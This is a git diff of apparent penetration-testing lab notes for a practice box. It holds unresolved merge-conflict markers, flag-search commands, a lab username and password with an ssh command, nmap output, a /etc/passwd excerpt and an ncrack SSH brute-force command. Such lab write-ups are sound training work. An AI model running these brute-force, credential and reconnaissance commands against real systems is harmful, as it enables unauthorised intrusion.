@@ -2,12 +2,20 @@
 # Summary
 - 
 # Flag Location
+<<<<<<< HEAD
+`Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Include local.txt,proof.txt`
+- 
+# Accounts
+### ???
+`<access command>`
+=======
 `sudo find / -type f -iname "local.txt" 2>/dev/null`    
 `sudo find / -type f -iname "proof.txt" 2>/dev/null`
 - /root/proof.txt
 # Accounts
 ### offsec / century62hisan51
 `ssh offsec@192.168.152.120`
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 
 ```
@@ -20,6 +28,12 @@ PORT   STATE SERVICE VERSION
 80/tcp open  http    WEBrick httpd 1.6.1 (Ruby 2.7.4 (2021-07-07))
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+<<<<<<< HEAD
+## Local Users
+`Get-LocalUser`
+```
+
+=======
 `sudo nmap -A -T4 -p- 192.168.213.120`
 ```
 PORT   STATE SERVICE VERSION
@@ -75,6 +89,7 @@ systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbi
 sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
 offsec:x:1000:1000:offsec,,,:/home/offsec:/bin/bash
 systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 ```
 ## Local Groups
 `Get-LocalGroup`
@@ -106,6 +121,9 @@ systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
 
 ## Command History
 ```c
+<<<<<<< HEAD
+=======
     ncrack -p 22 --connection-limit 1 -U usernames.txt -P passwords.txt 192.168.152.120
+>>>>>>> e06fa5ee92d068eeeeae2a07004803d05ab415ed
 
 ```
